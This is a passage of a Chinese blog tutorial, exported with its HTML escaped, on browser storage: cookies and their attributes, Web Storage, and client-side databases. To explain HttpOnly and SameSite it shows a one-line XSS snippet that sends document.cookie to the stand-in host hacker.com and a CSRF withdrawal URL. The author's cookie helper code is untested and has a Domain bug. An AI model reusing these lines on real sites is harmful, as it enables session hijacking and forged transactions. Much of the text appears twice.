&quot;name=value[;expires=date][;path=path-to-resource][;domain=域名][;secure]&quot;</code></p>\n<p>因为<code>document.cookie</code>是一个字符串，所以如果系统中需要频繁操作cookie，一般会把相关方法封装一下，也有一些现成的工具，如<code>jquery.cookie.js</code>、<code>js.cookie</code>等，下面是我的简单封装（未经调试，只是写下思路）：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> cookieObj = &#123;</span><br><span class=\"line\">\tget:<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">keyName</span>)</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!keyName)&#123;</span><br><span class=\"line\">  \t\t\talert(<span class=\"string\">'superMary says：cookieObj.get need a param！'</span>);</span><br><span class=\"line\">  \t\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> encodedKeyName = <span class=\"built_in\">encodeURIComponent</span>(keyName);</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> docCookieArr = <span class=\"built_in\">document</span>.cookie.split(<span class=\"string\">';'</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> resultCookie = docCookieArr.filter(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">item,index</span>)</span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">var</span> cookieArr = item.split(<span class=\"string\">'='</span>);</span><br><span class=\"line\">  \t\t\t<span class=\"keyword\">return</span> cookieArr[<span class=\"number\">0</span>] === encodedKeyName;</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(resultCookie.length&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">  \t\t\t<span class=\"keyword\">return</span> resultCookie[<span class=\"number\">0</span>].split(<span class=\"string\">'='</span>)[<span class=\"number\">1</span>];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\talert(<span class=\"string\">'superMary says：not find the cookie of'</span>+ keyName);\t\t</span><br><span class=\"line\">\t&#125;,</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tset:<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">oCookie</span>)</span>&#123;</span><br><span class=\"line\">  \t\t<span class=\"keyword\">var</span> cookieStr = <span class=\"built_in\">encodeURIComponent</span>(oCookie.keyName) + <span class=\"string\">'='</span> + <span class=\"built_in\">encodeURIComponent</span>(oCookie.keyValue);</span><br><span class=\"line\">  \t\t<span class=\"keyword\">if</span>(oCookie.expires)&#123;</span><br><span class=\"line\">  \t\t\tcookieStr += <span class=\"string\">';expires='</span> + oCookie.expires;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">      \t<span class=\"keyword\">if</span>(oCookie.path)&#123;</span><br><span class=\"line\">  \t\t\tcookieStr += <span class=\"string\">';path='</span> + oCookie.path;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">      \t<span class=\"keyword\">if</span>(oCookie.Domain)&#123;</span><br><span class=\"line\">  \t\t\tcookieStr += <span class=\"string\">';path='</span> + oCookie.path;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">      \t<span class=\"comment\">// secure和httpOnly...</span></span><br><span class=\"line\">\t&#125;,</span><br><span class=\"line\">  \tdelCookie:<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">keyName</span>)</span>&#123;</span><br><span class=\"line\">  \t\t<span class=\"keyword\">var</span> date = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>();</span><br><span class=\"line\">      \tdate.setHours(<span class=\"number\">-1</span>);</span><br><span class=\"line\">      \t<span class=\"keyword\">this</span>.set(&#123;</span><br><span class=\"line\">          keyName:keyName,</span><br><span class=\"line\">          expires:date</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"cookie属性\"><a href=\"#cookie属性\" class=\"headerlink\" title=\"cookie属性\"></a>cookie属性</h2><p>以CSDN网站的cookie为例：</p>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_0.png\" alt=\"图0_CSDN网站的cookie\"></p>\n<p>主要介绍以下参数：Domain / Path / Expires / Max-Age / HTTPOnly /  Secure /  SameSite</p>\n<h3 id=\"时间类属性-Expires-Max-Age\"><a href=\"#时间类属性-Expires-Max-Age\" class=\"headerlink\" title=\"时间类属性 Expires / Max-Age\"></a>时间类属性 Expires / Max-Age</h3><p><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</code></p>\n<p>Expires：指定一个GMT格式的绝对时间</p>\n<p>Max-Age：指定一个以秒为单位的相对时间，相对的是文档第一次被请求时服务器记录的请求时间</p>\n<h3 id=\"域类属性-Domain-Path\"><a href=\"#域类属性-Domain-Path\" class=\"headerlink\" title=\"域类属性 Domain / Path\"></a>域类属性 Domain / Path</h3><p><code>Set-Cookie: id=a3fWa;Domain=.baidu.com;Path = /;</code></p>\n<ol>\n<li><p>表示cookie所在的域，默认为html文件所在的域名，path为html文件所在的路径。</p>\n<p>例：为<a href=\"http://www.baidu.com/test/testCookie.html\" target=\"_blank\" rel=\"noopener\">http://www.baidu.com/test/testCookie.html</a> 页面中的js设置cookie，默认情况下cookie的的Domain为：.baidu.com，Path为：/test</p>\n</li>\n<li><p>cookie只能被该Domain域名或其子域名下的页面访问</p>\n</li>\n<li><p>cookie只能被该Path路径或其子路径下的页面访问</p>\n<ol>\n<li><p>二级域名间可以通过设置Domain共享Cookie，实现跨域。</p>\n<p>​例如：a.baidu.com      b.baidu.com<code>Set-Cookie: id=a3fWa;Domain=.baidu.com;Path = /;</code></p>\n</li>\n</ol>\n</li>\n</ol>\n<h3 id=\"安全类属性-Secure-HttpOnly\"><a href=\"#安全类属性-Secure-HttpOnly\" class=\"headerlink\" title=\"安全类属性 Secure / HttpOnly\"></a>安全类属性 Secure / HttpOnly</h3><p><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly;</code></p>\n<p> <strong>Secure</strong>指示浏览器仅通过 HTTPS 连接传回 cookie，仅用于HTTPS网站。</p>\n<p>注意：Chrome 52 、Firefox 52之前的版本，即使设置了Secure，仍然可以通过HTTP进行传输，所以即使设置了Secure，敏感信息依然不能存在cookie里。</p>\n<p><strong>HttpOnly</strong>设置了HttpOnly的Cookie只能发送给服务器，不能通过JavaScript访问，有助于防止cookie劫持类XSS攻cookie劫持类XSS攻击</p>\n<p><strong>cookie劫持类XSS攻击</strong></p>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_1.png\" alt=\"图1_Xss攻击图解\"></p>\n<p>var cookie = document.cookie;</p>\n<p>src=‘<a href=\"http://www.hacker.com?cookie=’\" target=\"_blank\" rel=\"noopener\">www.hacker.com?cookie=’</a> + cookie </p>\n<h3 id=\"安全类属性-SameSite\"><a href=\"#安全类属性-SameSite\" class=\"headerlink\" title=\"安全类属性 SameSite\"></a>安全类属性 SameSite</h3><ol>\n<li>表明这个 cookie 是个“同站 cookie”，同站 cookie 只能作为第一方 cookie，不能作为第三方 cookie。</li>\n<li>可以用来防范CSRF（Cross-Site Request Forgery跨站请求伪造）攻击</li>\n</ol>\n<p><strong>第三方cookie</strong> </p>\n<p>简单来说，第三方cookie就是HTTP请求的Referer值和请求的网址域名不同</p>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_2.png\" alt=\"图2_第三方cookie\"></p>\n<p><strong>CSRF攻击过程</strong></p>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_3.png\" alt=\"图3_CSRF攻击\"></p>\n<p>src=‘<a href=\"http://www.bankA.com/withdraw?money=1000&amp;to=hackerAccount’\" target=\"_blank\" rel=\"noopener\">www.bankA.com/withdraw?money=1000&amp;to=hackerAccount’</a> </p>\n<p>IE和Safari尚不支持，并且计划版本中也没有加入这个功能</p>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_4.png\" alt=\"图4_sameSite的浏览器支持情况\"></p>\n<h1 id=\"二、localStorage-sessionStorage\"><a href=\"#二、localStorage-sessionStorage\" class=\"headerlink\" title=\"二、localStorage / sessionStorage\"></a>二、localStorage / sessionStorage</h1><p>它相当于一个简易的客户端数据库，允许用户以key/value的形式存储数据。</p>\n<h3 id=\"区别\"><a href=\"#区别\" class=\"headerlink\" title=\"区别\"></a>区别</h3><p>localStorage：会一直保存在浏览器中，除非用户手动清除<br>sessionStorage：存储于浏览器端，<strong>是Tab级别的Session</strong> ，在新开的Tab页下，或者关闭本Tab再打开后，都是无法访问到之前保存的sessionStorage的。但如果只是刷新Tab页，则可以访问之前存储的Session<br>以下内容均以localStorage作例子</p>\n<h3 id=\"存储限制\"><a href=\"#存储限制\" class=\"headerlink\" title=\"存储限制\"></a>存储限制</h3><p>HTML5规范建议存储上限为5MB，各家浏览器在具体实现时的存储上限为每个域名5M~10MB</p>\n<h3 id=\"浏览器支持\"><a href=\"#浏览器支持\" class=\"headerlink\" title=\"浏览器支持\"></a>浏览器支持</h3><p>IE8+/11、Firefox 3.5+/57、Chrome 4+/62、Safari 4+/11、Opera 11.5+/48</p>\n<h3 id=\"用途：\"><a href=\"#用途：\" class=\"headerlink\" title=\"用途：\"></a>用途：</h3><p>Web Storage可以用来存储用户的操作状态、用户信息、会话信息等。并且可以用来创建离线使用的APP，用户离线时存储的数据可以在再次联网时发送给服务器做一次批量更新。</p>\n<h3 id=\"常用API\"><a href=\"#常用API\" class=\"headerlink\" title=\"常用API\"></a>常用API</h3><p>localStorage.setItem(keyName, keyValue);<br>localStorage.getItem(KeyName);<br>localStorage.removeItem(keyName) ;<br>localStorage.clear () ;<br>localStorage.length ;</p>\n<h3 id=\"Storage-Event\"><a href=\"#Storage-Event\" class=\"headerlink\" title=\"Storage Event\"></a>Storage Event</h3><p>当向storage中存储数据或移除数据时，会在window对象上触发一个<code>storage event</code>，可以添加监听器进行监听。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">window</span>.addEventListener(<span class=\"string\">'storage'</span>, storageEventHandler, <span class=\"literal\">false</span>);</span><br></pre></td></tr></table></figure>\n<p><strong>注意</strong><br>事件只能在别的浏览器窗口监听到（不是事件被触发的这个窗口），并且如果数据没有改变的话，不会触发事件。<br>只对localStorage 的改变有效，对sessionStorage无效</p>\n<p><strong>用途：</strong><br>可以用来在不同页面间实时同步数据（相同浏览器的不同窗口间）。</p>\n<h3 id=\"超出存储限制：\"><a href=\"#超出存储限制：\" class=\"headerlink\" title=\"超出存储限制：\"></a>超出存储限制：</h3><p><strong>QUOTA_EXCEEDED_ERR</strong> ：写入的数据大小超出浏览器的限制就会抛出这个异常<br>最佳实践是，当存储数据时使用try/catch包裹代码块。</p>\n<pre><code>function setSettings() {\n      if (&apos;localStorage&apos; in window &amp;&amp; window[&apos;localStorage&apos;] !== null) {\n          try {\n              localStorage.setItem(&apos;keyName&apos;, &apos;keyValue&apos;);\n          } catch (e) {\n              if (e == QUOTA_EXCEEDED_ERR) {\n                      alert(&apos;Quota exceeded!&apos;);\n                  }\n        }\n     } else {\n          alert(&apos;Cannot store user preferences as your browser do not support local storage&apos;);\n      }\n}\n</code></pre><h2 id=\"三、客户端数据库\"><a href=\"#三、客户端数据库\" class=\"headerlink\" title=\"三、客户端数据库\"></a>三、客户端数据库</h2><p>cookie、sessionStorage、localStorage容量较小，且只能处理key-value结构的简单的数据，而客户端数据库则可以解决这些问题。</p>\n<p><strong>包括</strong> ：Web SQL Database  / IndexedDB</p>\n<p><strong>访问</strong> ：同域名下可以访问。</p>\n<p><strong>存储时间</strong> ：永久存储，除非用户手动清除数据。</p>\n<p><strong>大小限制</strong> ：理论上没有大小限制，但IndexedDB的数据库超过50M的时候浏览器会弹出确认。</p>\n<h3 id=\"Web-SQL-Database\"><a href=\"#Web-SQL-Database\" class=\"headerlink\" title=\"Web SQL Database\"></a>Web SQL Database</h3><ol>\n<li>可以处理复杂的关系型数据，并且使用SQL语句进行操作</li>\n<li><p>因为过于依赖后端SQL语言的语法，<strong>已被Web应用工作组废弃</strong> ，但在手机端浏览器中的的支持率仍然较高</p>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_5.png\" alt=\"图5_Web SQL Database浏览器支持情况\"></p>\n</li>\n</ol>\n<p><strong>三个核心方法：</strong><br>openDatabase：创建数据库对象<br>transaction：用于根据情况控制事务提交或回滚<br>executeSql：用于执行SQL 查询</p>\n<h3 id=\"IndexedDB\"><a href=\"#IndexedDB\" class=\"headerlink\" title=\"IndexedDB\"></a>IndexedDB</h3><ol>\n<li>IndexedDB更像是NoSQL，可以直接使用JS的方法操作数据</li>\n<li>大部分浏览器都已支持或支持部分功能</li>\n</ol>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_6.png\" alt=\"图6_indexedDB浏览器支持情况\"></p>\n","site":{"data":{}},"excerpt":"<p>主要总结了前端常用的客户端存储技术，主要包括Cookie、HTML5 Web Storage，和客户端数据库的内容。</p>","more":"<blockquote>\n<p>by MaryTien from  <a href=\"http://supermaryy.com\">http://supermaryy.com</a></p>\n</blockquote>\n<h1 id=\"一、cookie\"><a href=\"#一、cookie\" class=\"headerlink\" title=\"一、cookie\"></a>一、cookie</h1><p>cookie是浏览器保存在用户计算机上的少量数据，每次发送HTTP请求时自动地在附在HTTP头部里。</p>\n<h2 id=\"容量限制\"><a href=\"#容量限制\" class=\"headerlink\" title=\"容量限制\"></a>容量限制</h2><ol>\n<li>存储容量较小，每个域名4K左右</li>\n<li>并有存储条数的限制，不同浏览器上限不同，一般在每个域名20~50条</li>\n<li>超出限制不会做任何提醒，后写入的cookie 会盖掉前面的cookie</li>\n</ol>\n<h2 id=\"存储时长\"><a href=\"#存储时长\" class=\"headerlink\" title=\"存储时长\"></a>存储时长</h2><ol>\n<li>如果设定了超时时间，cookie将在到期时失效。</li>\n<li><strong>如果没设定，将在关闭浏览器时失效。</strong>在未关闭浏览器的情况下，所有的tab级别的页面新开或刷新，cookie都可用。<strong>（区别于sessionStorage的Tab级session）</strong></li>\n</ol>\n<h2 id=\"典型使用场景\"><a href=\"#典型使用场景\" class=\"headerlink\" title=\"典型使用场景\"></a>典型使用场景</h2><ol>\n<li><p>Session管理：登录、购物车、游戏得分等用户状态</p>\n</li>\n<li><p>保存用户个性化设置，使用偏好、主题等</p>\n</li>\n<li><p>用户跟踪，记录和分析用户行为</p>\n</li>\n</ol>\n<h2 id=\"使用注意\"><a href=\"#使用注意\" class=\"headerlink\" title=\"使用注意\"></a>使用注意</h2><ol>\n<li>因为浏览器cookie容量有限，并且会在每一次请求中都附带cookie，所以应尽量避免使用cookie，仅是为了客户端存储的话，可以用Web Storage替代。只有需要每次请求都需要附带的信息，才需要使用cookie，例如身份验证信息。</li>\n<li>cookie的名/值对中的值不允许出现分号、逗号和空白符，因此在设置cookie时要先用encodeURIComponent()编码，读取时解码。</li>\n</ol>\n<h2 id=\"基本API\"><a href=\"#基本API\" class=\"headerlink\" title=\"基本API\"></a>基本API</h2><p><strong>后端设置cookie：</strong> <code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;</code></p>\n<p>后端接收到前端的请求时，返回一个包含<code>Set-Cookie</code>的响应头，浏览器接收响应后就会存储该cookie，并在之后的每一次请求中自动附带这个cookie，直到过了超时期限</p>\n<p><strong>前端设置cookie：</strong><code>document.cookie = &quot;name=value[;expires=date][;path=path-to-resource][;domain=域名][;secure]&quot;</code></p>\n<p>因为<code>document.cookie</code>是一个字符串，所以如果系统中需要频繁操作cookie，一般会把相关方法封装一下，也有一些现成的工具，如<code>jquery.cookie.js</code>、<code>js.cookie</code>等，下面是我的简单封装（未经调试，只是写下思路）：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> cookieObj = &#123;</span><br><span class=\"line\">\tget:<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">keyName</span>)</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!keyName)&#123;</span><br><span class=\"line\">  \t\t\talert(<span class=\"string\">'superMary says：cookieObj.get need a param！'</span>);</span><br><span class=\"line\">  \t\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> encodedKeyName = <span class=\"built_in\">encodeURIComponent</span>(keyName);</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> docCookieArr = <span class=\"built_in\">document</span>.cookie.split(<span class=\"string\">';'</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> resultCookie = docCookieArr.filter(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">item,index</span>)</span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">var</span> cookieArr = item.split(<span class=\"string\">'='</span>);</span><br><span class=\"line\">  \t\t\t<span class=\"keyword\">return</span> cookieArr[<span class=\"number\">0</span>] === encodedKeyName;</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(resultCookie.length&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">  \t\t\t<span class=\"keyword\">return</span> resultCookie[<span class=\"number\">0</span>].split(<span class=\"string\">'='</span>)[<span class=\"number\">1</span>];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\talert(<span class=\"string\">'superMary says：not find the cookie of'</span>+ keyName);\t\t</span><br><span class=\"line\">\t&#125;,</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tset:<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">oCookie</span>)</span>&#123;</span><br><span class=\"line\">  \t\t<span class=\"keyword\">var</span> cookieStr = <span class=\"built_in\">encodeURIComponent</span>(oCookie.keyName) + <span class=\"string\">'='</span> + <span class=\"built_in\">encodeURIComponent</span>(oCookie.keyValue);</span><br><span class=\"line\">  \t\t<span class=\"keyword\">if</span>(oCookie.expires)&#123;</span><br><span class=\"line\">  \t\t\tcookieStr += <span class=\"string\">';expires='</span> + oCookie.expires;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">      \t<span class=\"keyword\">if</span>(oCookie.path)&#123;</span><br><span class=\"line\">  \t\t\tcookieStr += <span class=\"string\">';path='</span> + oCookie.path;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">      \t<span class=\"keyword\">if</span>(oCookie.Domain)&#123;</span><br><span class=\"line\">  \t\t\tcookieStr += <span class=\"string\">';path='</span> + oCookie.path;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">      \t<span class=\"comment\">// secure和httpOnly...</span></span><br><span class=\"line\">\t&#125;,</span><br><span class=\"line\">  \tdelCookie:<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">keyName</span>)</span>&#123;</span><br><span class=\"line\">  \t\t<span class=\"keyword\">var</span> date = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>();</span><br><span class=\"line\">      \tdate.setHours(<span class=\"number\">-1</span>);</span><br><span class=\"line\">      \t<span class=\"keyword\">this</span>.set(&#123;</span><br><span class=\"line\">          keyName:keyName,</span><br><span class=\"line\">          expires:date</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"cookie属性\"><a href=\"#cookie属性\" class=\"headerlink\" title=\"cookie属性\"></a>cookie属性</h2><p>以CSDN网站的cookie为例：</p>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_0.png\" alt=\"图0_CSDN网站的cookie\"></p>\n<p>主要介绍以下参数：Domain / Path / Expires / Max-Age / HTTPOnly /  Secure /  SameSite</p>\n<h3 id=\"时间类属性-Expires-Max-Age\"><a href=\"#时间类属性-Expires-Max-Age\" class=\"headerlink\" title=\"时间类属性 Expires / Max-Age\"></a>时间类属性 Expires / Max-Age</h3><p><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</code></p>\n<p>Expires：指定一个GMT格式的绝对时间</p>\n<p>Max-Age：指定一个以秒为单位的相对时间，相对的是文档第一次被请求时服务器记录的请求时间</p>\n<h3 id=\"域类属性-Domain-Path\"><a href=\"#域类属性-Domain-Path\" class=\"headerlink\" title=\"域类属性 Domain / Path\"></a>域类属性 Domain / Path</h3><p><code>Set-Cookie: id=a3fWa;Domain=.baidu.com;Path = /;</code></p>\n<ol>\n<li><p>表示cookie所在的域，默认为html文件所在的域名，path为html文件所在的路径。</p>\n<p>例：为<a href=\"http://www.baidu.com/test/testCookie.html\" target=\"_blank\" rel=\"noopener\">http://www.baidu.com/test/testCookie.html</a> 页面中的js设置cookie，默认情况下cookie的的Domain为：.baidu.com，Path为：/test</p>\n</li>\n<li><p>cookie只能被该Domain域名或其子域名下的页面访问</p>\n</li>\n<li><p>cookie只能被该Path路径或其子路径下的页面访问</p>\n<ol>\n<li><p>二级域名间可以通过设置Domain共享Cookie，实现跨域。</p>\n<p>​例如：a.baidu.com      b.baidu.com<code>Set-Cookie: id=a3fWa;Domain=.baidu.com;Path = /;</code></p>\n</li>\n</ol>\n</li>\n</ol>\n<h3 id=\"安全类属性-Secure-HttpOnly\"><a href=\"#安全类属性-Secure-HttpOnly\" class=\"headerlink\" title=\"安全类属性 Secure / HttpOnly\"></a>安全类属性 Secure / HttpOnly</h3><p><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly;</code></p>\n<p> <strong>Secure</strong>指示浏览器仅通过 HTTPS 连接传回 cookie，仅用于HTTPS网站。</p>\n<p>注意：Chrome 52 、Firefox 52之前的版本，即使设置了Secure，仍然可以通过HTTP进行传输，所以即使设置了Secure，敏感信息依然不能存在cookie里。</p>\n<p><strong>HttpOnly</strong>设置了HttpOnly的Cookie只能发送给服务器，不能通过JavaScript访问，有助于防止cookie劫持类XSS攻cookie劫持类XSS攻击</p>\n<p><strong>cookie劫持类XSS攻击</strong></p>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_1.png\" alt=\"图1_Xss攻击图解\"></p>\n<p>var cookie = document.cookie;</p>\n<p>src=‘<a href=\"http://www.hacker.com?cookie=’\" target=\"_blank\" rel=\"noopener\">www.hacker.com?cookie=’</a> + cookie </p>\n<h3 id=\"安全类属性-SameSite\"><a href=\"#安全类属性-SameSite\" class=\"headerlink\" title=\"安全类属性 SameSite\"></a>安全类属性 SameSite</h3><ol>\n<li>表明这个 cookie 是个“同站 cookie”，同站 cookie 只能作为第一方 cookie，不能作为第三方 cookie。</li>\n<li>可以用来防范CSRF（Cross-Site Request Forgery跨站请求伪造）攻击</li>\n</ol>\n<p><strong>第三方cookie</strong> </p>\n<p>简单来说，第三方cookie就是HTTP请求的Referer值和请求的网址域名不同</p>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_2.png\" alt=\"图2_第三方cookie\"></p>\n<p><strong>CSRF攻击过程</strong></p>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_3.png\" alt=\"图3_CSRF攻击\"></p>\n<p>src=‘<a href=\"http://www.bankA.com/withdraw?money=1000&amp;to=hackerAccount’\" target=\"_blank\" rel=\"noopener\">www.bankA.com/withdraw?money=1000&amp;to=hackerAccount’</a> </p>\n<p>IE和Safari尚不支持，并且计划版本中也没有加入这个功能</p>\n<p><img src=\"http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_4.png\" alt=\"图4_sameSite的浏览器支持情况\"></p>\n<h1 id=\"二、localStorage-sessionStorage\"><a href=\"#二、localStorage-sessionStorage\" class=\"headerlink\" title=\"二、localStorage / sessionStorage\"></a>二、localStorage / sessionStorage</h1><p>它相当于一个简易的客户端数据库，允许用户以key/value的形式存储数据。</p>\n<h3 id=\"区别\"><a href=\"#区别\" class=\"headerlink\" title=\"区别\"></a>区别</h3><p>localStorage：会一直保存在浏览器中，除非用户手动清除<br>sessionStorage：存储于浏览器端，<strong>是Tab级别的Session</strong> ，在新开的Tab页下，或者关闭本Tab再打开后，都是无法访问到之前保存的sessionStorage的。但如果只是刷新Tab页，则可以访问之前存储的Session<br>以下内容均以localStorage作例子</p>\n<h3 id=\"存储限制\"><a href=\"#存储限制\" class=\"headerlink\" title=\"存储限制\"></a>存储限制</h3><p>HTML5规范建议存储上限为5MB，各家浏览器在具体实现时的存储上限为每个域名5M~10MB</p>\n<h3 id=\"浏览器支持\"><a href=\"#浏览器支持\" class=\"headerlink\" title=\"浏览器支持\"></a>浏览器支持</h3><p>IE8+/11、Firefox 3.5+/57、Chrome 4+/62、Safari 4+/11、Opera 11.5+/48</p>\n<h3 id=\"用途：\"><a href=\"#用途：\" class=\"headerlink\" title=\"用途：\"></a>用途：</h3><p>Web Storage可以用来存储用户的操作状态、用户信息、会话信息等。并且可以用来创建离线使用的APP，用户离线时存储的数据可以在再次联网时发送给服务器做一次批量更新。</p>\n<h3 id=\"常用API\"><a href=\"#常用API\" class=\"headerlink\" title=\"常用API\"></a>常用API</h3><p>localStorage.setItem(keyName, keyValue);<br>localStorage.getItem(KeyName);<br>localStorage.removeItem(keyName) ;<br>localStorage.clear () ;<br>localStorage.length ;</p>\n<h3 id=\"Storage-Event\"><a href=\"#Storage-Event\" class=\"headerlink\" title=\"Storage Event\"></a>Storage Event</h3><p>当向storage中存储数据或移除数据时，会在window对象上触发一个<code>storage event</code>，可以添加监听器进行监听。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">window</span>.addEventListener(<span class=\"string\">'storage'</span>, storageEventHandler, <span class=\"literal\">false</span>);</span><br></pre></td></tr></table></figure>\n<p><strong>注意</strong><br>事件只能在别的浏览器窗口监听到（不是事件被触发的这个窗口），并且如果数据没有改变的话，不会触发事件。<br>只对localStorage 的改变有效，对sessionStorage无效</p>\n<p><strong>用途：</strong><br>可以用来在不同页面间实时同步数据（相同浏览器的不同窗口间）。</p>\n<h3 id=\"超出存储限制：\"><a href=\"#超出存储限制：\" class=\"headerlink\" title=\"超出存储限制：\"></a>超出存储限制：</h3><p><strong>QUOTA_EXCEEDED_ERR</strong> ：写入的数据大小超出浏览器的限制就会抛出这个异常<br>最佳实践是，当存储数据时使用try/catch包裹代码块。</p>\n<pre><code>function setSettings() {\n      if (&apos;localStorage&apos; in window &amp;&amp; window[&apos;localStorage&apos;] !== null) {\n          try {\n              localStorage.setItem(&apos;keyName&apos;, &apos;keyValue&apos;);\n          } catch (e) {\n              if (e == QUOTA_EXCEEDED_ERR) {\n                      alert(&apos;Quota exceeded!&apos;);\n                  }\n        }\n     } else {\n          alert(&apos;Cannot store user preferences as your browser do not 